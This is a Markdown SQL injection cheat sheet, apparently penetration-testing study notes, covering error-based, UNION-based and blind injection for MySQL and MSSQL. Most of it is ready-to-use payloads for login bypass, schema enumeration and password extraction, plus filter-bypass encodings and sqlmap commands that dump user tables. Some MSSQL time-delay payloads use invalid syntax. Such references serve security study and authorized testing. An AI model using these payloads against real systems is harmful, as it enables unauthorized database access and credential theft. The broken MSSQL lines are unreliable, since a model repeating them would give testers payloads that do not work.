# SQL Injection (SQLi) Reference Guide

## Table of Contents
1. [Overview](#overview)
2. [Database Fundamentals](#database-fundamentals)
3. [Attack Types](#attack-types)
   - [Error-Based SQLi](#error-based-sql-injection)
   - [UNION-Based SQLi](#union-based-sql-injection)
   - [Blind SQLi](#blind-sql-injection)
4. [Database-Specific Syntax](#database-specific-syntax)
5. [Testing Methodology](#testing-methodology)
6. [Automation & Tools](#automation--tools)

---

## Overview

- **OWASP Ranking**: A03:2021-Injection (3rd in Top 10)
- **Definition**: Manipulation of SQL queries through unsanitized user input
- **Impact**: Database access, authentication bypass, data extraction
- **Root Cause**: Direct string concatenation without input validation

### Vulnerable Code Pattern
```php
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
```

### Basic Attack Example
```sql
-- Normal: SELECT * FROM users WHERE user_name= 'leon'
-- Malicious: leon' OR 1=1-- //
-- Result: SELECT * FROM users WHERE user_name= 'leon' OR 1=1-- //'
```

---

## Database Fundamentals

### Architecture
- **Frontend**: HTML/CSS/JavaScript interface
- **Backend**: PHP/Java/Python application layer  
- **Database**: SQL data storage (MySQL, MSSQL, PostgreSQL, Oracle)

### Basic SQL Syntax
```sql
SELECT * FROM users WHERE user_name='leon'
```
- `SELECT *`: Retrieve all columns
- `FROM users`: Target table
- `WHERE`: Filter condition

---

## Attack Types

## Error-Based SQL Injection

**Concept**: Exploit database error messages to extract information
**Requirement**: Application displays database errors

### Detection Payloads
```sql
'                    -- Basic quote test
admin'--             -- Comment injection
' OR 1=1-- //        -- Boolean test
```

### Authentication Bypass
```sql
' OR 1=1-- //                    -- Always true condition
admin' OR 'a'='a'-- //           -- String comparison bypass
1 OR 1=1-- //                    -- Numeric field bypass
```

### Information Extraction
```sql
-- Database version
' OR 1=1 IN (SELECT @@version)-- //

-- List databases (MySQL)
' OR 1=1 IN (SELECT schema_name FROM information_schema.schemata)-- //

-- Extract user data
' OR 1=1 IN (SELECT password FROM users WHERE username='admin')-- //

-- Concatenated extraction (MySQL)
' OR 1=1 IN (SELECT CONCAT(username,':',password) FROM users)-- //
```

### Advanced Error Functions

**MySQL:**
```sql
-- EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- //

-- UPDATEXML (MySQL 5.1+)  
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)-- //
```

**MSSQL:**
```sql
-- CAST conversion error
' AND 1=CAST((SELECT @@version) AS INT)-- //

-- CONVERT error
' AND 1=CONVERT(INT, (SELECT @@version))-- //
```

---

## UNION-Based SQL Injection

**Concept**: Combine results from multiple SELECT statements
**Requirements**: Equal column count + compatible data types

### Column Count Detection
```sql
-- Method 1: ORDER BY
' ORDER BY 1-- //     -- Increment until error
' ORDER BY 5-- //     -- Error: "Unknown column '5'"

-- Method 2: UNION SELECT  
' UNION SELECT 1,2,3,4-- //     -- Success indicates 4 columns
```

### Information Gathering
```sql
-- Basic info extraction
' UNION SELECT null, @@version, database(), user()-- //

-- Database enumeration
' UNION SELECT null, schema_name, null, null FROM information_schema.schemata-- //

-- Table enumeration  
' UNION SELECT null, table_name, null, null FROM information_schema.tables WHERE table_schema=database()-- //

-- Data extraction
' UNION SELECT null, username, password, null FROM users-- //
```

### Handling Column Mismatches
```sql
-- Use NULL for missing columns (recommended)
' UNION SELECT username, password, NULL, NULL FROM users-- //

-- Use numbers for tracking
' UNION SELECT username, password, 3, 4 FROM users-- //
```

### Advanced Techniques
```sql
-- Multiple table joins
' UNION SELECT u.username, u.password, p.data, null FROM users u JOIN profiles p ON u.id=p.user_id-- //

-- Conditional extraction
' UNION SELECT null, CASE WHEN LENGTH(password)>10 THEN username ELSE 'short' END, password, null FROM users-- //
```

---

## Blind SQL Injection

**Concept**: Infer database responses through application behavior
**Types**: Boolean-based (response differences) and Time-based (delays)

### Boolean-Based Blind SQLi

**Detection:**
```sql
' AND 1=1-- //        -- TRUE condition (normal response)
' AND 1=2-- //        -- FALSE condition (different response)
```

**Information Extraction:**
```sql
-- Database version testing
' AND @@version LIKE '8%'-- //

-- Database name length
' AND LENGTH(database())=6-- //

-- Character-by-character extraction  
' AND SUBSTRING(database(),1,1)='o'-- //

-- Table existence
' AND (SELECT COUNT(*) FROM users)>0-- //
```

### Time-Based Blind SQLi

**MySQL Functions:**
```sql
-- Basic delay
' AND IF(1=1,SLEEP(5),0)-- //

-- Conditional delay
' AND IF(database()='offsec',SLEEP(3),0)-- //

-- Alternative: BENCHMARK
' AND IF(1=1,BENCHMARK(5000000,MD5('test')),0)-- //
```

**MSSQL Functions:**
```sql
-- WAITFOR DELAY
' AND IF(1=1,WAITFOR DELAY '00:00:05',0)-- //

-- Heavy query delay
' AND IF(1=1,(SELECT COUNT(*) FROM sysusers AS s1, sysusers AS s2),0)-- //
```

### Optimization Techniques
```sql
-- Binary search for faster extraction
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(2),0)-- //

-- Batch testing
' AND IF(LENGTH(database())=6 AND SUBSTRING(database(),1,1)='o',SLEEP(3),0)-- //

-- EXISTS for faster boolean checks
' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'),SLEEP(2),0)-- //
```

---

## Database-Specific Syntax

### MySQL vs MSSQL Comparison

| Feature | MySQL | MSSQL |
|---------|-------|-------|
| **Default Port** | 3306 | 1433 |
| **Version Function** | `version()` or `@@version` | `@@version` |
| **User Function** | `system_user()` | `USER_NAME()` |
| **List Databases** | `SHOW databases;` | `SELECT name FROM sys.databases;` |
| **Schema Format** | `database.table` | `database.schema.table` |
| **Comments** | `-- //`, `#`, `/* */` | `--`, `/* */` |
| **Time Function** | `SLEEP()` | `WAITFOR DELAY` |
| **Concatenation** | `CONCAT()` | `+` operator |

### Connection Commands
```bash
# MySQL
mysql -u root -p'password' -h target -P 3306

# MSSQL (Kali Linux)
impacket-mssqlclient user:pass@target -windows-auth
```

### Core Functions
```sql
-- MySQL
SELECT version(), database(), user();
SHOW databases;
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

-- MSSQL  
SELECT @@version, DB_NAME(), USER_NAME();
SELECT name FROM sys.databases;
SELECT table_name FROM information_schema.tables;
```

---

## Testing Methodology

### SQLi Detection Checklist
- [ ] Test single/double quotes for errors
- [ ] Test comment syntax (`--`, `#`, `/* */`)
- [ ] Test boolean conditions (`1=1` vs `1=2`)
- [ ] Test time delays (`SLEEP()`, `WAITFOR DELAY`)
- [ ] Test UNION injection with column detection

### Attack Progression
1. **Detection**: Identify injection points
2. **Fingerprinting**: Determine database type/version
3. **Enumeration**: Map database structure  
4. **Extraction**: Retrieve sensitive data
5. **Automation**: Use tools for complex extraction

### Common Error Messages
```
MySQL: "You have an error in your SQL syntax"
MSSQL: "Conversion failed when converting varchar value"
Column Count: "The used SELECT statements have different number of columns"
```

---

## Automation & Tools

### SQLMap Usage
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# Specific techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
```

### Performance Comparison
| Technique | Speed | Stealth | Requirements |
|-----------|-------|---------|--------------|
| **Error-Based** | Medium | Low | Error display |
| **UNION-Based** | Fast | Low | Column matching |
| **Boolean Blind** | Fast | Medium | Response differences |
| **Time-Based Blind** | Slow | High | Time delays |

### Time Estimates
- **Boolean-based**: ~1-2 seconds per character
- **Time-based**: ~3-5 seconds per character + delay
- **Binary search optimization**: ~50% reduction in attempts
- **Full database extraction**: Hours without automation

---

## Key Payloads Quick Reference

### Authentication Bypass
```sql
' OR 1=1-- //
admin' OR 'a'='a'-- //
' OR 1=1 #
```

### Information Extraction
```sql
-- Error-based
' OR 1=1 IN (SELECT @@version)-- //
' OR 1=1 IN (SELECT table_name FROM information_schema.tables)-- //

-- UNION-based  
' UNION SELECT null, @@version, database(), user()-- //
' UNION SELECT null, username, password, null FROM users-- //

-- Boolean blind
' AND LENGTH(database())=6-- //
' AND SUBSTRING(database(),1,1)='o'-- //

-- Time-based blind
' AND IF(database()='offsec',SLEEP(3),0)-- //
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(2),0)-- //
```

### Filter Bypasses
```sql
-- Case variation
' uNiOn SeLeCt null,username,password,null FROM users-- //

-- Comment insertion
' UNION/**/SELECT/**/null,username-- //

-- URL encoding
'%20OR%201=1--%20//

-- Double encoding
'%2527%2520OR%25201=1
```